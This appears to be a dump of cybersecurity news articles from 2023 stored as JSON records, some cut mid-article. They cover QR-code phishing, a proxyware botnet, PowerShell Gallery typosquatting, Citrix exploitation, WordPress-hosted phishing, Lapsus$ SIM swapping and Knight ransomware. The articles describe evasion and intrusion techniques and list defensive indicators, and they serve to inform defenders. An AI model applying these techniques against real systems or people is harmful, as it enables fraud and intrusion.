      "text": " A phishing campaign was observed predominantly targeting a notable energy company in the US, employing QR codes to slip malicious emails into inboxes and bypass security.Roughly one-third (29%) of the 1,000 emails attributed to this campaign targeted a large US energy company, while the remaining attempts were made against firms in manufacturing (15%), insurance (9%), technology (7%), and financial services (6%).According to Cofense, who spotted this campaign, this is the first time that QR codes have been used at this scale, indicating that more phishing actors may be testing their effectiveness as an attack vector.Cofense did not name the energy company targeted in this campaign but categorized them as a \"major\" US-based company.The emails carry PNG or PDF attachments featuring a QR code the recipient is prompted to scan to verify their account. The emails also state that the target must complete this step in 2-3 days to add a sense of urgency.The threat actors use QR codes embedded in images to bypass email security tools that scan a message for known malicious links, allowing the phishing messages to reach the target’s inbox.To evade security, the QR codes in this campaign also use redirects in Bing, Salesforce, and Cloudflare’s Web3 services to redirect the targets to a Microsoft 365 phishing page.Hiding the redirection URL in the QR code, abusing legitimate services, and using base64 encoding for the phishing link all help evade detection and get through email protection filters.Despite their effectiveness in bypassing protections, QR codes still require the victim to take action to get compromised, which is a decisive mitigating factor working in favor of well-trained personnel.Also, most QR code scanners on modern smartphones will ask the user to verify the destination URL before launching the browser as a protective step.Apart from training, Cofense also suggests that organizations use image recognition tools as part of their phishing protection measures, although these are not guaranteed to catch all QR code threats."

      "text": " Google has announced the first open-source quantum resilient FIDO2 security key implementation, which uses a unique ECC/Dilithium hybrid signature schema co-created with ETH Zurich.FIDO2 is the second major version of the Fast IDentity Online authentication standard, and FIDO2 keys are used for passwordless authentication and as a multi-factor authentication (MFA) element.Google explains that a quantum-resistant FIDO2 security key implementation is a crucial step towards ensuring safety and security as the advent of quantum computing approaches and developments in the field follow an accelerating trajectory.\"In particular, standard public key cryptography, which was designed to protect against traditional computers, will not be able to withstand quantum attacks.\"With quantum computers being actively developed, there is concern that they will soon be used to more efficiently and quickly crack encryption keys, making encrypted information accessible to governments, threat actors, and researchers.To protect against quantum computers, a new hybrid algorithm was created by combining the established ECDSA algorithm with the Dilithium algorithm.This hybrid signature approach that blends classic and quantum-resistant features wasn't simple to manifest, Google says. Designing a Dilithium implementation that's compact enough for security keys was incredibly challenging.Its engineers, however, managed to develop a Rust-based implementation that only needs 20KB of memory, making the endeavor practically possible, while they also noted its high-performance potential.The tech giant hopes that its proposal will be adopted by FIDO2 as a new standard and supported by major web browsers with large user bases.The firm calls the application of next-gen cryptography at the internet scale \"a massive undertaking\" and urges all stakeholders to move quickly to maintain good progress on that front.This move came in anticipation of the risk of future quantum computers having the capacity to decrypt today's data, addressing the \"Harvest Now, Decrypt Later\" threat."

      "text": " Researchers have uncovered a massive campaign that delivered proxy server apps to at least 400,000 Windows systems. The devices act as residential exit nodes without users' consent and a company is charging for the proxy traffic running through the machines..Some proxy companies sell access to residential proxies and offer monetary rewards to users who agree to share their bandwidth.In a report today, AT&T Alien Labs says that the 400,000-node proxy network was built by using malicious payloads that delivered the proxy application.Despite the company behind the botnet claiming that users gave their consent, the researchers discovered that the proxy installed silently on the devices.\"In addition, as the proxy application is signed, it has no anti-virus detection, going under the radar of security companies,\" the researchers added.In fact, the two Go-based binaries (for macOS and Windows) appear to originate from the same source code, however, the Windows proxy client evades antivirus detection due to using a valid digital signature.The infection starts with the execution of a loader hidden in cracked software and games, which downloads and installs the proxy application automatically in the background without user interaction.The malware authors use Inno Setup with specific parameters that hide any indicators of the installation process and all typical user prompts.During the installation of the proxy client, the malware sends specific parameters, which are also relayed to the command and control (C2) server so that the new client can be registered and incorporated into the botnet.The proxy client establishes persistence on the infected system by creating a registry key to activate it when the system boots and a by adding a scheduled task that to check for new client updates.\"The proxy then continuously gathers vital information from the machine to ensure optimal performance and responsiveness,\" explains the AT&T report.\"This includes everything from the process list and monitoring CPU to memory utilization and even tracking battery status.\"AT&T recommends looking for a \"Digital Pulse\" executable at \"%AppData%\\\" or a similarly named Registry key on \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\.\" If any are present, the researchers recommend removing them.The name of the scheduled task is \"DigitalPulseUpdateTask\" and should also be deleted to eliminate the chance of the client update mechanism re-introducing the infection.Finally, avoid downloading pirated software and running executables sourced from dubious locations like peer-to-peer networks or site offering premium software free of charge.Signs of proxyware infection include performance and internet speed degradation, unexpected network traffic patterns, frequent communication with unknown IPs or domains, and system alerts."

      "title": "PowerShell Gallery Prone to Typosquatting, Other Supply Chain Attacks",
      "text": " [Editor's Note: This article was updated on 8/18/2023 with a response received from Microsoft]Microsoft's PowerShell Gallery presents a software supply chain risk because of its relatively weak protections against attackers who want to upload malicious packages to the online repository, according to researchers at Aqua Nautilus.They recently tested the repository's policies regarding package names and owners and found that a threat actor could easily abuse them to spoof legitimate packages and make it hard for users to identify the true owner of a package.\"If your organization uses PowerShell modules from the gallery, we suggest only using signed PowerShell modules, utilizing trusted private repositories, and exercising caution when downloading new modules/scripts from registries,\" says Yakir Kadkoda, lead security researcher at Aqua. \"Second, we advise similar platforms to the PowerShell Gallery to take necessary steps to enhance their security measures. For instance, they should implement a mechanism that prevents developers from uploading modules with names too similar to existing ones.\"Kadkoda says Microsoft acknowledged the issues when informed about them and claimed it had addressed two separate issues, once in February 2022 and a second time this past January. \"However, we've continued to check, and these issues still exist\" as of Aug. 16, he says.Microsoft said it added functions to find and eradicate malicious packages. \"We're aware of this report and have determined that it relies on social engineering to be successful. However we've implemented some changes to help identify and remove these packages,\" a Microsoft spokeswoman said in an emailed statement to Dark Reading after this story was published. \"We encourage users to report any packages they suspect are malicious via the \"Report\" link on the package module.\"Microsoft said it will continue to monitor for malicious activity on PowerShell Gallery and take defense-in-depth measures to keep customers protected.PowerShell Gallery is a widely used repository for finding, publishing, and sharing PowerShell code modules and so-called desired state configuration (DSC) resources. Many of the packages on the registry are from trusted entities, such as Microsoft, AWS, and VMware, while many others are from community members. There have been more than 1.6 billion package downloads from the repository so far this year alone.One issue that Aqua discovered was the lack of any kind of protection against typosquatting, a deception technique that threat actors have increasingly used in recent years to trick users into downloading malicious packages from public software repositories. Typosquatters typically use names that are phonetically similar to names of popular and legitimate packages on public repositories, such as npm, PyPI, and Maven. They then rely on users making typos when searching for these packages and downloading their malicious package instead. The technique has become a common software supply chain attack vector.Aqua found PowerShell Gallery's policies did little to protect against such deception. For instance, the names of most Azure packages on the repository followed a specific pattern, namely, \"Az.<package_name>.\" However, some other very popular Azure packages such as \"Aztable\" did not follow the pattern and did not have a dot in the name.  Aqua found that there are no restrictions on the prefixes that package developers can use when naming their packages. For example, when Aqua's researchers crafted a nearly perfect replica of Aztable and labeled it Az.Table, they had no problem uploading the proof-of-concept (PoC) code to PowerShell Gallery. Callback code that Aqua included in the PoC showed that several hosts across various cloud services had downloaded the package in the first few hours alone.\"In our opinion, other registries have more protective measures,\" Kadkoda says. \"For instance, npm, another registry platform by Microsoft, uses 'Moniker' rules specifically designed to combat typosquatting,\" he says. One example: Since a package named \"react-native\" already exists on npm, no one labels their module with variation such as \"reactnative,\" \"react_native,\" or \"react.native.\"Another problem that Aqua uncovered with PowerShell Gallery's policies is how they allowed a threat actor to make a malicious package appear legitimate by faking crucial details such as the Author(s), Description, and Copyright fields.  \"An attacker can freely choose any name when creating a user in the PowerShell Gallery,\" Aqua said in its blog post. \"Therefore, determining the actual author of a PowerShell module in the PowerShell Gallery poses a challenging task.\"Unsuspecting users who find these packages on PowerShell Gallery can easily be deceived into believing that the author of the malicious package is a legitimate entity, such as Microsoft, Aqua said.In addition, Aqua's analysis showed that one API in PowerShell Gallery's basically gave threat actors a way to find unlisted modules on the registry — and potentially any sensitive data associated with those modules. Typically, an unlisted module is private and should not be something that an attacker would be able to find via a search of the repository. Aqua researchers found they could not only pull up such modules, they also found one that contained sensitive secrets that belonged to a large technology company.Kadkoda says there is no evidence to suggested that threat actors have leveraged these weaknesses to sneak malicious package into PowerShell Gallery. However, the threat is real. \"It's important to note that, according to Microsoft, they scan PowerShell modules/scripts uploaded to the gallery,\" Kadkoda says. \"This is a good measure to block malicious uploads. However, it remains a cat-and-mouse game between Microsoft's solution and attackers.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

As a precautionary measure, the compromised systems have remained offline until today to allow for enhanced security measures.“When it comes to ransomware, a common misconception is that organizations escape unscathed if criminals do not encrypt their data, but this is completely wrong. Even if data isn’t held hostage, organizations can still incur huge financial losses as a result of downtime and recovery,” Schroeder explained.The cyber-attack has disrupted Clorox’s manufacturing and distribution processes, affecting its ability to fulfil orders and maintain normal operations. The company has activated its business continuity plans to mitigate the impact and ensure its products remain available to consumers.“The Clorox Company recently identified unusual activity on our IT systems. Upon detection, we immediately took steps to stop the activity and took certain systems offline. While we are working diligently to respond to and address this issue, these systems will remain offline out of an abundance of caution, as we work to add additional protections and hardening measures to further secure them. As a result, some operations are temporarily impaired. We are following our business continuity plans and implementing workarounds where possible,” the company said in a statement received by Infosecurity.“The investigation into the nature and scope of the incident remains ongoing and is in its very early stages.

They claim the recipient has a parcel waiting but needs to click through and enter their personal details, sometimes including financial information, to reschedule the delivery.Social media and HMRC tax scams were also frequently encountered by respondents, NatWest claimed. However, fraud relating to high street banks appeared to drop from 2022 figures, hitting just 10% of those polled for the study.NatWest said that women were “slightly more likely” to have encountered a scam in the past 12 months but over twice as likely to lose money than men. The average amount lost by victims of fraud was around £80 ($102).Students living in Bournemouth were most likely to have been hit by scams, with 44% of respondents living in the south coast city saying they had encountered fraud over the previous year. Next came Edinburgh and Oxford. Students in Bristol and Leicester were least likely to be on the receiving end of a fraud attempt (25%).“It is really important that students remain vigilant and are on their guard when they receive an unexpected text message, email or phone call asking for personal details,” explained head of NatWest student accounts, Jaimala Patel."

The company says that over 83% of these customers had patched their environments before the flaw was publicly disclosed.\"Through our research we were able to achieve unauthenticated arbitrary file upload and full remote code execution by exploiting a seemingly innocuous cryptographic bug,\" AssetNote researchers explain.Using this flaw, a threat actor could upload a web shell to a device to gain full access to the storage and all its files.While CISA shares this same warning on many advisories, flaws impacting managed file transfer (MFT) solutions are of particular concern, as threat actors have heavily exploited them to steal data from companies in extortion attacks.As part of AssetNote's technical writeup, the researchers shared enough information for threat actors to develop exploits for the Citrix ShareFile CVE-2023-24489 flaw. Soon after, other researchers released their own exploits on GitHub.On July 26th, GreyNoise began monitoring for attempts to exploit the vulnerability. After CISA warned about the flaw today, GreyNoise updated its report to say there had been a significant uptick in attempts by different IP addresses.At this time, GreyNoise has seen attempts to exploit or check if a ShareFile server is vulnerable from 72 IP addresses, with the majority from South Korea and others in Finland, the United Kingdom, and the United States.While no publicly known exploitation or data theft has been linked to this flaw, CISA now requires Federal Civilian Executive Branch (FCEB) agencies to apply patches for this bug by September 6th, 2023.However, due to the highly targeted nature of these bugs, it would be strongly advised that all organizations apply the updates as soon as possible.Citrix ShareFile told BleepingComputer that this vulnerability impacted less than 3% of their install base (2800 customers) and that there is no known data theft due to this vulnerability.Update 8/22/23: Added information from Citrix."

      "text": " Freelance JournalistA recent study by cybersecurity firm Kaspersky has revealed the techniques utilized by phishers to evade detection and exploit compromised websites for phishing attacks.According to a technical write-up published by security researchers Tatyana Machneva and Olga Svistunova on Monday, one common strategy is the hacking of abandoned or poorly maintained websites. These sites become vulnerable due to outdated security patches, providing cyber-criminals an easy entry point. Phishers can then embed malicious content within these sites, often going unnoticed for extended periods.Even active but smaller websites are not immune to such attacks, Kaspersky explained. Financial constraints and lack of security expertise make them appealing targets. As links to scam pages are often shared via email or instant messaging, the popularity of a website becomes less relevant to phishers than its susceptibility to compromise.Additionally, the research highlights the prevalence of WordPress-powered websites in these attacks, with 43.1% of all websites on the internet relying on this content management system. Hackers frequently exploit vulnerabilities in plugins and the platform itself.“Otherwise, attackers may set up malicious domains long before launching phishing campaigns so as to trick systems that automatically flag messages from newly created domains. Breaching WordPress sites solves this issue because the domains are not newly registered, and hackers can avoid the risk and hassle of registering a domain they intend to use for their malicious purposes.”Kaspersky’s study also provides insights into the methods employed by these malicious actors to infiltrate and manipulate control panels of hacked websites."

Administrators can recognize their scans by checking the Citrix HTTP Access logs for the user-agent: DIVD-2023-00033.Initially, the scans considered only vulnerable systems but later expanded to Citrix instances that received the update to address CVE-2023-3519.This revealed 1,952 NetScaler servers backdoored with the same web shells Fox-IT found during the incident response engagements, indicating that the adversary used an automated method to exploit the vulnerability at a large scale.In a larger context, the 1,952 backdoored servers represent more than 6% of the 31,127 Citrix NetScaler instances vulnerable to CVE-2023-3519 at a global level when the campaign was active.On August 10, Fox-IT and DIVD started to reach out to organizations, either directly or through national CERTs, about compromised NetScaler instances on their network.Yesterday, the largest number of compromised Citrix NetScaler servers, both patched and unpatched, was in Germany, followed by France and Switzerland.Fox-IT says that Europe is the most affected, highlighting that of the top 10 affected countries, only two are from a different region of the world.Another detail the researchers observed is that while Canada, Russia, and the U.S. had thousands of vulnerable NetScaler servers on July 21, they found compromising web shells on almost none of them.Fox-IT says that the number of affected Citrix NetScaler servers is declining but there are still plenty of compromised instances.The researchers warn that a patched NetScaler server can still have a backdoor and recommend administrators perform basic triage on their systems."

      "text": " The Monti ransomware operators returned, after a two-month break, with a new Linux version of the encryptor. The variant was employed in attacks aimed at organizations in government and legal sectors.According to Trend Micro, this variant is quite different from the previous Linux-based version.The new Linux variant of the ecryptor doesn’t accept some arguments from its older variant and adds the –whitelist parameter, which is used to avoid encrypting virtual machines. The researchers observed that the developers also tampered with the /etc/motd and index.html files, replacing their contents with a ransom note.The new Linux variant uses AES-256-CTR encryption instead of Salsa20. The researchers also discovered that the new variant, unlike the previous version which utilized a –size argument to determine the percentage of the file to be encrypted, solely relies on the file size for its encryption process.“It’s likely that the threat actors behind Monti still employed parts of the Conti source code as the base for the new variant, as evidenced by some similar functions, but implemented significant changes to the code — especially to the encryption algorithm.” concludes the report. “Furthermore, by altering the code, Monti’s operators are enhancing its ability to evade detection, making their malicious activities even more challenging to identify and mitigate.”\nCopyright@securityaffairs 2023 "

It's pathetic. I tried reporting my hacked account, going through identity verification, and even DMing them on @linkedinhelp on twitter. No responses anywhere. What a joke of a company..\"Cyberint says there are also signs of a breakout reflected in Google Trends, where search terms about LinkedIn account hack or recovery record an increase of 5,000% over the past few months.The attackers appear to be using leaked credentials or brute-forcing to attempt to take control of a large number of LinkedIn accounts.For accounts that are appropriately protected by strong passwords and/or two-factor authentication, the multiple takeover attempts resulted in a temporary account lock imposed by the platform as a protection measure.Owners of these accounts are then prompted to verify ownership by providing additional information and also update their passwords before they're allowed to sign in again.When the hackers successfully take over poorly protected LinkedIn accounts, they quickly swap the associated email address with one from the \"rambler.ru\" service. After that, the hijackers change the account password, preventing the original holders from accessing their accounts. Many of the users also reported that the hackers turned on 2FA after hijacking the account, making the account recovery process even more difficult.In some cases observed by Cyberint, the attackers demanded a small ransom to give the accounts back to the original owners or outright deleted the accounts without asking for anything.If you maintain a LinkedIn account, now would be a good time to review the security measures you've activated, enable 2FA, and switch to a unique and long password.BleepingComputer has contacted LinkedIn requesting a comment on the reported situation, but we have not received a response by publication time."

In addition, threat actors could tamper with operations, cause a PLC to run in an unusual way, or steal critical information by deploying a backdoor via an RCE.The researchers acknowledged that exploitation is difficult, with attackers requiring user authentication alongside “deep knowledge of the proprietary protocol of CODESYS V3 and the structure of the different services that the protocol uses.”Microsoft said it reported the latest discovery to CODESYS in September 2022 and worked with the firm to develop patches.CODESYS customers have been urged to apply these fixes as soon as possible. Microsoft recommended that they first identify the devices using CODESYS in their network before checking with device manufacturers to determine which version of the CODESYS SDK is used and whether a patch is available."

Many of the computers belong to hackers, the researchers say.Analyzing the data, threat researchers found that the passwords used for logging into hacking forums were generally stronger than those for government websites.Hudson Rock says that 100,000 of the compromised computers belonged to hackers and the number of credentials for cybercrime forums was in excess of 140,000.The researchers collected the information from publicly available leaks as well as info-stealer logs sourced directly from threat actors.Info-stealers are a type of malware that search specific locations on the computer for login information. A common target is web browsers, because of their autofill and password storage features. Alon Gal, chief technology officer at Hudson Rock, told BleepingComputer that “hackers around the world infect computers opportunistically by promoting results for fake software or through YouTube tutorials directing victims to download infected software.”Among those that fell for the lure were other hackers, likely less skilled ones, so they got infected just like any other gullible user trying to take a shortcut.Identifying the owners of those compromised computers as hackers, or at least hacker enthusiasts, was possible by looking at the data from the info-stealer logs, which also exposed the individual’s real identity:Looking at the collected data, Hudson Rock determined that more than 57,000 compromised users had accounts to the Nulled[.]to community of budding cybercriminals.However, hackers also used very weak passwords like a string of consecutive numbers. This could be explained by their lack of interest in getting involved in the community.They could be using the account just to keep up with the discussions, check what data was for sale, or just to have access to the forum whenever something more important occurred.The researchers also discovered that the credentials for cybercrime forums were generally stronger than the logins for government websites, although the difference is not large.According to Hudson Rock, most of the infections were from just three info-stealers, which also happen to be popular choices with many hackers: RedLine, Raccoon, and Azorult.At the moment, a large number of initial access compromises start with an info-stealer, which collects all the data a threat actor needs to impersonate a legitimate user, typically called a system fingerprint."

      "text": " Attackers are increasingly targeting abandoned and barely maintained websites for hosting phishing pages, according to a new study from Kaspersky.In many cases, phishers' focus is on WordPress sites because of the sheer number of known vulnerabilities in the widely used content management system and its numerous plug-ins.Researchers at Kaspersky recently counted 22,400 unique WordPress websites that threat actors had compromised between mid-May and the end of July to host phishing pages. The number included websites that attackers were literally able to walk into because they provided open access to the control panel, as well as sites that attackers had to break into via vulnerability exploits, credential theft, and other means. Kaspersky detected 200,213 attempts by users to visit phishing pages that threat actors had hosted on these websites.Phishing continues to be one of the most popular initial access vectors for attackers because of just how successful they have been with it. Fundamental to that success is their ability to create convincing websites and pages that users are likely to trust enough to share their credentials and other sensitive information.Kaspersky researchers found that to improve the con, phishing operators sometimes leave a compromised website's main functionality untouched even as they publish phishing pages on the site. \"A visitor would never guess the site has been hacked: every section is where it is supposed to be, and only relevant information can be seen,\" Kaspersky said. Instead, the attackers hide their phishing pages inside new directories that are not accessible on the website's menu, the security vendor said.Kaspersky found that typically, when an attacker breaks into a WordPress site via a vulnerability, they upload a WSO Web shell, which is a malicious shell script that allows attackers complete remote control over the website. The attackers then use the Web shell to break into the compromised website's admin panel and start putting fake pages on it. They also use the control panel to store credentials, bank card data, and other sensitive information that a user might be tricked into entering on the website. When an attacker leaves access to the control panel open, anyone on the Internet can then get access to the data, Kaspersky said.\"Seasoned cybercriminals hack legitimate websites as a way of setting phishing traps,\" Kaspersky said. \"Both long-neglected and actively maintained websites may be targeted this way,\" especially when the websites are small, and the operators are ill-equipped to detect malicious activity.Kaspersky's blog offered tips on how WordPress website operators can detect if an attacker has hacked their website and is using it to host phishing pages.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Furthermore, many people lose cryptocurrency through information-stealing malware or phishing attacks that steal wallets, likely making this number far larger.This situation creates an opportunity for recovery scheme scammers who tap into this vast pool of victims, taking advantage of their desperation to recover their funds while only deceiving them a second time.\"Victims may also encounter advertisements for fraudulent cryptocurrency recovery services in the comment sections of online news articles and videos about cryptocurrency; among online search results for cryptocurrency; or on social media.\"BleepingComputer has seen these types of scams posted to our own news stories, in other sites' comment sections, and on Medium.While social media, especially Twitter, has been attempting to crack down on these scams, they are still plagued by cryptocurrency support and recovery scams. The FBI explains that recovery schemes aim to deceive individuals into bearing the expenses of the purported recovery, often asking for an advance fee or some form of deposit.Once the payment is made, the scammers either cut off communication with the victims or try to solicit additional funds by presenting an incomplete tracing report, suggesting they need more resources to finalize it.In many cases observed by the FBI, the scammers claim they're affiliated with law enforcement agencies or other legitimate organizations to instill a sense of trustworthiness in their targets.However, as the FBI highlights, no private sector entity can issue seizure orders to recover stolen digital assets, so all claims of that kind are false, and those making them should be treated as highly suspicious.To protect yourself against these fraudulent companies or individual scammers, do not trust cryptocurrency recovery services promoted via internet ads, comments, and social media. Furthermore, never share any personal or financial details with unknown individuals online.Victims of these scams can also pursue civil litigation to recover the lost assets, so keeping all records, transaction details, and interactions with suspicious individuals is essential.However, as many of these recovery companies are operating under fake names, it will likely not be possible to litigate this type of theft in court."

They demonstrate a high level of expertise in Magento and invest considerable time in understanding its internals, setting up attack infrastructure, and testing their exploits on real targets.” concludes the report. “This campaign serves as a practical example of how older vulnerabilities continue to be exploited years after disclosure, as businesses struggle to keep up with patches and security measures.”The report also includes indicators of compromise (IOCs).\nCopyright@securityaffairs 2023 "

Most of the community was built around the service's Discord server, with over 14,000 members.Yesterday, a person known as 'Akhirah' began offering the Discord.io database for sale on the new Breached hacking forums. As proof of the theft, the threat actor shared four user records from the database.For those unfamiliar with the new Breached, it is the rebirth of a popular cybercrime forum known for the sale and leaking of data stolen in data breaches.According to the threat actor, the database contains the information for 760,000 Discord.io users and includes the following types of information:The most sensitive information in the breach is a member's username, email address, billing address (small number of people), salted and hashed password (small number of people), and Discord ID.\"This information is not private and can be obtained by anyone sharing a server with you. Its inclusion in the breach does, however, mean that other people might be able to link your Discord account to a given email address,\" Discord.io explained about the leaking of Discord IDs.\"Discord.io has suffered a data breach. We are stopping all operations for the foreseeable future,\" reads a message on the service's Discord server.\"For more information, please refer to our #breah-notification channel. We'll be updating our website soon with a copy of this message.\"The website for Discord.io contains a timeline explaining that they first learned of the data breach after seeing the post on the hacking forum.Soon after, they confirmed the authenticity of the leaked data and began shutting down its services and canceling all paid memberships.Discord.io says they have not been contacted by the individual behind the breach and have not shared any information on how they were breached.BleepingComputer spoke to the seller of the Discord.io database, Akhirah, who confirmed that they had not spoken to the Discord.io operators.The Discord.io site acts as a directory where visitors can search for Discord servers matching specific content and obtain an invite to access it. In some cases, it is required to purchase and spend the site's virtual currency, Discord.io Coins, to gain access to an invite.From the limited archived pages of the site, BleepingComputer has seen Discord servers in the directory for a wide variety of interests, including anime, gaming, adult content, and more.However, when BleepingComputer asked Akhirah about the sale of the database, they said it was not only about making money but about how Discord.io allegedly links to illegal and harmful content.\"It's not just about money, some of the servers they overlook I talking about pedophilia and similar things, they should blacklist them and not allow them,\" Akhirah told BleepingComputer.The hacker told BleepingComputer that there has been a lot of interest in the database but mostly from people who want to use it for \"doxing other people they have problems with.\"Instead, Akhirah says they would prefer to wait for the Discord.io operators to contact them about removing allegedly offensive material from the site in exchange for not selling or leaking the stolen database.While the hacker says they have not sold the database, all members should treat the situation as if their data will be abused.The passwords in this breach are hashed using bcrypt, making them hardware-intensive and slow to crack.However, email addresses can be valuable to other threat actors as they could be used for targeted phishing attacks to steal more sensitive information.Therefore, if you are a member of Discord.io, you should be on the lookout for unusual emails with links to pages asking you to enter your password or other information.Update 8/14/23: Added information from Akhirah."

      "title": "Lapsus$ hackers took SIM-swapping attacks to the next level",
      "text": " The U.S. government released a report after analyzing simple techniques, e.g. SIM swapping, used by the Lapsus$ extortion group to breach dozens of organizations with a strong security posture.Lapsus$ is described as a loosely-organized group formed mainly of teenagers, with members in the U.K. and Brazil that acted between 2021 and 2022 for notoriety, financial gain, or for fun. However, they also combined techniques of various complexity with “flashes of creativity.”The Department of Homeland Security (DHS) Cyber Safety Review Board (CSRB) finalized its analysis and describes the group’s tactics and techniques in a report that also includes recommendations for the industry.“Lapsus$ employed low-cost techniques, well-known and available to other threat actors, revealing weak points in our cyber infrastructure that could be vulnerable to future attacks” - Department of Homeland Security Cyber Safety Review Board.The group used SIM swapping to gain access to a target company’s internal network and steal confidential information like source code, details about proprietary technology, or business and customer-related documents.In a SIM-swapping attack, the threat actor steals the victim’s phone number by porting it to a SIM card owned by the attacker. The trick relies on social engineering or an insider at the victim’s mobile carrier.With control over the victim’s phone number, the attacker can receive SMS-based ephemeral codes for two-factor authentication (2FA) required to log into various enterprise services or breach corporate networks.In the case of Lapsus$, some of the fraudulent SIM swaps were performed straight from the telecommunications provider’s customer management tools after hijacking accounts belonging to employees and contractors.An attacker can create a fake EDR by impersonating a legitimate requestor, such as a law enforcement agent, or by applying official logos to the request.Lapsus$ also relied on insiders at targeted companies, employees, or contractors, to obtain credentials, approve multi-factor authentication (MFA) requests, or use internal access to help the threat actor.“After executing the fraudulent SIM swaps, Lapsus$ took over online accounts via sign-in and account recovery workflows that sent one-time links or MFA passcodes via SMS or voice calls” - Department of Homeland Security Cyber Safety Review Board.In one case, Lapsus$ used their unauthorized access to a telco provider to try to compromise mobile phone accounts connected to FBI and Department of Defense personnel.The attempt was unsuccessful due to extra security implemented for those accounts.During the research, CSRB’s findings, the group paid as much as $20,000 per week to access a telecommunications provider’s platform and perform SIM swaps.Although the FBI was not aware of Lapsus$ selling the data they stole or found evidence of victims paying ransoms to the group, CSRB says that some security experts “observed Lapsus$ extorting organizations with some paying ransoms.”According to CSRB’s findings the group also exploited unpatched vulnerabilities in Microsoft Active Directory to increase their privileges on the victim network.It is estimated that Lapsus$ leveraged Active Directory security issues in up to 60% of their attacks, showing that members of the group had the technical skills to move inside a network.While Lapsus$ was characterized by effectiveness, speed, creativity, and boldness, the group was not always successful in its attacks. It failed in environments that implemented application or token-based multi-factor authentication (MFA).Despite security researchers and experts decrying for years the use of SMS-based authentication as insecure, DHS’ Cyber Safety Review Board highlights that “most organizations were not prepared to prevent” the attacks from Lapsus$ or other groups employing similar tactics.The Board’s recommendations to prevent other actors from gaining unauthorized access to an internal network include:Lapsus$ fell silent since September 2022, likely due to law enforcement investigations that led to the arrests of several members of the group."

      "text": " Update 8/11/23: Updated with information from DOJ about alleged Netwalker Ransomware involvement.Police have taken down the Lolek bulletproof hosting provider, arresting five individuals and seizing servers for allegedly facilitating Netwalker ransomware attacks and other malicious activities.A bulletproof hosting provider is a hosting company that turns a blind eye to reports of criminal activity or the hosting of copyrighted material on their servers.Cybercriminals prefer these types of hosting providers over traditional companies, as they can launch cybercrime campaigns without fear that they will be shut down after malicious activity is reported.On Tuesday, BleepingComputer learned that the platform's site at lolekhosted[.]net had been seized, now displaying a message stating that an international law enforcement operation between Poland and the US seized the site.\"This domain has been seized by the Federal Bureau of Investigation and Internal Revenue Service - Criminal Investigation as part of a coordinated law enforcement action taken against LOLEK HOSTED,\" reads the Lolek seizure message.Lolek promoted itself as a \"100% privacy hosting\" service with a no-log policy, meaning they do not log any activity on its servers or routers that could be used to incriminate customers.Customer reviews of the service seen by BleepingComputer said that almost any activity was allowed at the hosting provider, and the platform accepted PayPal and cryptocurrency for payments.While the FBI and IRS declined to comment earlier this week on the investigation, Europol and the DOJ announced today the seizure of Lolek and the arrest of five administrators in Poland.\"Five of its administrators were arrested, and all of its servers seized, rendering LolekHosted.net no longer available.\"Europol says that Lolek was seized as cybercriminals used its servers to launch DDoS attacks, distribute information-stealing malware, host command and control servers, host fake online shops, and conduct spam campaigns.However, an announcement by the US Department of Justice sheds more light on the police operation, stating that a Polish national named Artur Karol Grabowski was charged yesterday for the operation of LolekHosted.While it is unclear if Grabowski was one of the administrators arrested in Poland, the DOJ says he facilitated cybercrime by allowing customers to register under fake names, frequently changing IP address of servers, and notifying customers of legal inquiries.\"Specifically, clients used the servers of LolekHosted as intermediaries when gaining unauthorized access to victim networks, and to store hacking tools and data stolen from victims.\" Law enforcement seized the bulletproof hosting provider's servers on August 8th in an operation led by the FBI and IRS, with Europol providing support linking available data to various criminal cases within and outside the EU, as well as tracing cryptocurrency transactions.Grabowski now faces charges of computer fraud conspiracy, wire fraud conspiracy, and international money laundering, and if convicted of all, could receive 45 years of jail time.As bulletproof hosting providers have become a significant component in malware distribution and cybercrime, law enforcement has been actively targeting these platforms."

      "text": " The Knight ransomware is being distributed in an ongoing spam campaign that pretends to be TripAdvisor complaints.Knight ransomware is a recent rebrand of the Cyclop Ransomware-as-a-Service, which switched its name at the end of July 2023.The Cyclops ransomware operation launched in May 2023 when the operators began recruiting affiliates for the new ransomware-as-a-service (RaaS) on the RAMP hacking forum.In addition to their normal encryptors, the operation offers a 'lite' version for use in spam and pray-and-spray mass distribution campaigns targeting large numbers of targeted users. This version appears to utilize a fixed ransom amount rather than negotiating with victims.At the end of July, Cyclops rebranded as Knight, also stating they updated the lite encryptor to support 'batch distribution' and launched a new data leak site.\"We've updated our new panel and officially changed our name to Knight.We are looking for partners (of any kind) that!!!,\" reads an announcement on the old Cyclops and new Knight data leak sites.\"We have also updated the lite version to support batch distribution.\"There are currently no victims or stolen files leaked on the Knight data leak site.This week, Sophos researcher Felix spotted a new spam campaign pretending to be TripAdvisor complaints but distribute the Knight ransomware instead.When you open the XLL, Microsoft Excel will detect the Mark of the Web (MoTW), added to files downloaded from the Internet, including email. If it detects the MoTW, it will not enable the .NET add-in built into the Excel document, nullifying the attack unless a user unblocks the file.However, if there is no MoTW flag on the file, Excel will prompt the user as to whether they want to enable the add-in, as shown below.Enabling the add-in will cause the Knight Lite ransomware encryptor to be injected into a new explorer.exe process and begin to encrypt the files on your computer.When encrypting files, it will append the .knight_l extension to encrypted files' names, where the 'l' portion likely stands for 'lite.'The ransomware will also create a ransom note named How To Restore Your Files.txt in each folder on the computer. The ransom note in this campaign demands $5,000 be sent to a listed Bitcoin address and also contains a link to the Knight Tor site.However, every ransom note in this campaign seen by BleepingComputer utilizes the same Bitcoin address of '14JJfrWQbud8c8KECHyc9jM6dammyjUb3Z,' which would make it impossible for the threat actor to determine which victim paid a ransom.As this is a Knight Lite campaign, visiting the site does not display a negotiation panel. Instead, it shows a message stating that victims should have paid the ransom demand already and to contact the affiliate at brahma2023@onionmail.org then.At this time, it is not known if paying a ransom will result in receiving a decryptor from the Knight affiliate.Furthermore, all the ransom notes seen by BleepingComputer utilize the same Bitcoin address, making it possible for someone else to claim a payment as theirs, essentially stealing your payment.Therefore, it is strongly advised to refrain from paying a ransom in this campaign, as there is a good chance you will not receive a decryptor."

      "title": "MaginotDNS attacks exploit weak checks for DNS cache poisoning",
